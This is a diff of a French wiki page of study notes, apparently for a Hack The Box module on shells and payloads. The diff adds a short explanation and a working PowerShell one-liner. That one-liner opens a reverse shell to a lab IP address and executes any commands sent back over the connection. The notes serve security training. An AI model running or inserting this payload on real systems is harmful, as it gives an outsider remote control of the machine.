@@ -2,7 +2,7 @@
 title: Shells & Payloads
 description: 
 published: true
-date: 2025-05-17T19:21:13.415Z
+date: 2025-05-17T19:23:09.013Z
 tags: htb, module
 editor: markdown
 dateCreated: 2025-05-04T16:19:33.360Z
@@ -170,5 +170,8 @@ Il est possible d'utilise Netcat sur Windows pour initier le reverse shell, cepe
  
 Au moment de la tentative d'établissement d'un Reverse Shell, il est recommandé de regarder quels langages shell et applications sont présentes sur la cible. Ces outils peuvent parfois être utilisés pour initier le reverse shell.
 
+Voici un exemple de client Powershell (ou payload) "One-liner" permettant d'initier le reverse shell:
 
-
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
